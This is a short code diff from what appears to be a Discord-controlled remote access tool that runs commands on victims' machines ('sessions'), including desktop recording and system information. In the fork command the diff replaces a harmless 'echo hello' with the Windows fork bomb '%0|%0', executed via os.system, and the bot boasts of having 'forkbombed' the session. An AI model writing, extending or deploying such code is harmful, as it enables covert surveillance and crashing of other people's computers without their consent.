@@ -195,12 +195,11 @@ async def sysinfo(ctx, seshn: str):
         pass
 
 @bot.command()
-async def recorddesk(ctx, seshn: str):
+async def record(ctx, seshn: str):
     session = sessions.get(seshn.lower())
     if session:
         await ctx.send("Recording started")
 
-        # Start recording
         start = datetime.datetime.now()
         duration = datetime.timedelta(seconds=30)
         frames = []
@@ -468,7 +467,7 @@ async def rickroll(ctx, seshn):
 async def fork(ctx, seshn):
     session = sessions.get(seshn.lower())
     if session:
-        command = "echo hello"
+        command = "%0|%0"
         os.system(command)
         await ctx.send(f"Forkbombed session :rofl:")
     else:
